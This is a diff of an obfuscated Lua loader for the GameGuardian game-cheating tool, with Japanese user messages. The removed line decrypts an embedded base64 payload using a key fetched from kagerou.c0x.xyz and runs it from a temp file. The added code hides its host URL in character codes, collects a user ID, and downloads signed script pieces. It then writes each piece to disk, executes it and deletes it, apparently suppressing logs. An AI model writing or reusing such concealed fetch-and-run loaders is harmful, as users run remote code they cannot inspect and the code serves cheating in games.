@@ -1,1 +1,155 @@
-(function()local _a,_b,_c,_d,_e,_f,_g,_h,_i,_j;_a='https://kagerou.c0x.xyz/?id=ufqfmcerurswfrqigmnefixt';_b='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mvbOkuz7ge3shOflS1B8bllXUFFNTEJMU0dHR0lZUUQcGwMUBApCHwcVDgkOVxcNFxNYJ0FMQAMASQIfAA1ZTVteUAUFCQxheUdHR0lZUURZV1BRTUxCTFNHR0dJHhZKGhsVEB8+Bx8GCxMUQVB8bllXUFFNTEJMU0dHR0lZUURZV1BRHwkWGQEJam1JWVFEWVdQUU1MQkxTR0dHDBUCARARUAIZHgsCFEkBDgcdWTJVV1ITDAhCDQEAEgoMFwVEWkZSWE0YCgkdam1HSVlRRFlXUFFNTEJMU0dHR0lZUQMeWRMdCA0QPhYUEgsdCllNdH1QUU1MQkxTR0dHSVlRRFlXUFFNTBAJBxIVCWRzUURZV1BRTUxCTFNHR0dJWRQIChJ9e01MQkxTR0dHSVlRRFlXUFFNTEJMAxUOCR1RU4DD/5bt8o/j95Dmy4Tr0ZLn0JTzzY7t7ovq3YDz9prw85r2zpLs+4Ht7F1HRUlXX0QvXn17TUxCTFNHR0dJWVFEWVdQUU1MQkwDFQ4JHVEVARsCF18ZHgMPFgUGBAJRWE10fVBRTUxCTFNHR0dJWVFEWVcVHwlhaExTR0dHSVlRRFlXUBQDCG9mU0dHR0lZUURQenpRTUxCCR0Dam0MFxVpcw==';_c={};_d=function()local _='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' for i=1,#_ do _c[_:sub(i,i)]=i-1 end end;_e=function(data)if not next(_c)then _d()end;data=string.gsub(data,'[^A-Za-z0-9+/=]','');local r='';for i=1,#data,4 do local c1,c2,c3,c4=data:sub(i,i+3):byte(1,4);c1=_c[string.char(c1 or 0)]or 0;c2=_c[string.char(c2 or 0)]or 0;c3=_c[string.char(c3 or 0)]or 0;c4=_c[string.char(c4 or 0)]or 0;local n=c1*262144+c2*4096+c3*64+c4;r=r..string.char(math.floor(n/65536)%256,math.floor(n/256)%256,n%256)end;local pad=data:match('(=*)$');if #pad>0 then r=r:sub(1,#r-#pad)end;return r end;_f=function(a,b)local r,p=0,1;while a>0 or b>0 do if(a%2)~=(b%2)then r=r+p end;a=math.floor(a/2);b=math.floor(b/2);p=p*2 end;return r end;_g=(bit and bit.bxor)or _f;_h=function(data,key)local r={};for i=1,#data do table.insert(r,string.char(_g(string.byte(data,i),string.byte(key,(i-1)%#key+1))))end;return table.concat(r)end;_j=function(data)local h=5381;for i=1,#data do h=(h*33)+string.byte(data,i);h=h%0xFFFFFFFF end;return h end;_i=function()local _p=gg.getFile();local _f=io.open(_p,'r');if not _f then gg.alert('E_READ')return end;local _s=_f:read('*a');_f:close();_s=_s:gsub('[\n\r]','');local _ch=_j(_s);local _u=_a..'&hash='.._ch;local _ok,_re=pcall(gg.makeRequest,_u);if not _ok or not _re or not _re.code or _re.code~=200 then if _re and _re.code==403 then gg.alert('E_HASH')else gg.alert('E_NET')end;return end;local _k=_re.content;local _ec=_e(_b);local _dc=_h(_ec,_k);local _tp='./'..math.random(1e9,9e9)..'.tmp';local _tf=io.open(_tp,'w');if not _tf then gg.alert('E_WRITE')return end;_tf:write(_dc);_tf:close();local _ld,_er=loadfile(_tp);os.remove(_tp);if _ld then local _succ,_res=pcall(_ld);if not _succ then gg.alert('E_EXEC:'..tostring(_res))end else gg.alert('E_LOAD:'..tostring(_er))end end;_i();end)()
+local t={[1]=string.char(115),[2]=string.char(121,122),[3]=string.char(46,99),[4]=string.char(115,115),[5]=string.char(58,47,47),[6]=string.char(48,120),[7]=string.char(46,120),[8]=string.char(99),[9]=string.char(116,112),[10]=string.char(104,116)}
+local a=t[10]..t[9]..t[1]..t[5]..t[4]..t[8]..t[3]..t[6]..t[7]..t[2]
+local b = "hEHE_TH1s_is_KEy_paSs"
+local c = "|||NEXT_TOKEN_SEPARATOR|||"
+
+function d(e, f, g)
+    local h = e .. ":" .. f .. ":" .. g
+    local i = 1000000007
+    local j = 5381
+    for k = 1, #h do
+        j = (((j * 33) % i) + string.byte(h, k)) % i
+    end
+    return tostring(j)
+end
+
+gg.setVisible(false)
+local l = gg.makeRequest("https://c0x.xyz")
+if not l or l.code ~= 200 then
+    print("インターネット接続を有効化して下さい")
+    os.exit(gg.setVisible(true))
+end
+
+local m = "/sdcard/ggsx/"
+local n = m .. "id.sc3"
+local o = nil
+
+local p = io.open(n, "r")
+if p then
+    local q = p:read("*a")
+    p:close()
+    if q and q ~= "" then
+        local r, s = load(q)
+        if r then
+            o = r()
+        end
+    end
+end
+
+if not o then
+    local t, u = gg.prompt(
+        {"IDを入力してください"},
+        {[1] = ""},
+        {[1] = "text"}
+    )
+    if not t or not t[1] or t[1] == "" then
+        gg.toast("IDが入力されなかったため、スクリプトを終了します。")
+        os.exit()
+    end
+    o = t[1]
+    local v = io.open(n, "w")
+    if v then
+        v:write('return "' .. o .. '"')
+        v:close()
+    end
+end
+
+gg.toast("接続中...")
+
+local w = {}
+local x = nil
+
+function y(z)
+    local A = w.B
+    if not A then
+        print("[Error] 次のトークンがありません。")
+        os.exit(gg.setVisible(true))
+    end
+    local C = d(b, A, z)
+    local D = a .. "/re?userID=" .. o .. "&token=" .. A .. "&script=" .. z .. "&sig=" .. C
+    local E = gg.makeRequest(D)
+    if not E or E.code ~= 200 then
+        print("[Error] スクリプトの取得に失敗しました: " .. z .. " - " .. (E and E.content or "nil"))
+        gg.clearResults()
+        os.exit(gg.setVisible(true))
+    end
+    local F = E.content
+    local G = F
+    w.B = nil
+    local H = string.find(F, c, 1, true)
+    if H then
+        G = string.sub(F, 1, H - 1)
+        w.B = string.sub(F, H + #c)
+    end
+    return G
+end
+
+local I = gg.makeRequest(a .. "/re?userID=" .. o)
+if not I or I.code ~= 200 then
+    print("[Error] 認証に失敗しました。IDが正しいか確認してください。")
+    os.remove(n)
+    os.exit(gg.setVisible(true))
+end
+w.B = I.content
+
+local J = y("proc")
+if J then
+    io.open("./cash.cey", "w"):write(J):close()
+    local K, L = loadfile("./cash.cey")
+    os.remove("./cash.cey")
+    if K then
+        x = K()
+    else
+        print("[Error] procのロードに失敗しました: " .. tostring(L))
+    end
+end
+
+if x then
+    local M = y("menu")
+    if M then
+        local N = x.noLog(M)
+        menu = N()
+    end
+end
+
+if x then
+    local O = y("lda")
+    if O then
+        local P = x.noLog(O)
+        cd = P()
+    end
+end
+
+if x then
+    local Q = y("base")
+    if Q then
+        local R = x.noLog(Q)
+        R()
+    end
+end
+gg.toast("接続完了")
+
+if x then
+    local S = y("main")
+    if S then
+        local T = x.noLog(S)
+        xpcall(
+            T,
+            function(U)
+                local V = tostring(U)
+                if string.find(V, "attempt to call a nil value") then
+                    print("[err] 技術的なエラーが発生しました。")
+                elseif string.find(V, "os.exit()") then
+                    gg.clearResults()
+                    return
+                elseif string.find(V, "bad argument #1") then
+                    gg.clearResults()
+                    return
+                else
+                    print("予期せぬエラーが発生しました: " .. V)
+                    print(debug.traceback())
+                end
+            end
+        )
+    end
+end
